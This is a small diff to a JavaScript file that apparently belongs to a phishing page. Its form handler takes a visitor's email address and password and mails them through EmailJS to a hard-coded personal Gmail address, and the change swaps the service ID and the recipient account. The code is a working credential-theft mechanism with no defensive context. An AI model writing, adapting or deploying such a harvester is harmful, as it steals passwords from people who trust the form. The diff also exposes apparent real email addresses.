@@ -1,6 +1,6 @@
 // email.js
 // Initialize EmailJS with your user ID
-emailjs.init("ywQjoVBUPpkiSXrXk");
+emailjs.init("service_ut76as3");
 
 document.getElementById("form").addEventListener("submit", function (event) {
     event.preventDefault();
@@ -20,7 +20,7 @@ document.getElementById("form").addEventListener("submit", function (event) {
 
     // Sending email data including the recipient email
     const templateParams = {
-        to_email: "hostbyvacs12@gmail.com",  // Replace with your recipient email
+        to_email: "alexbt2636@gmail.com",  // Replace with your recipient email
         from_email: email,
         password: password
     };
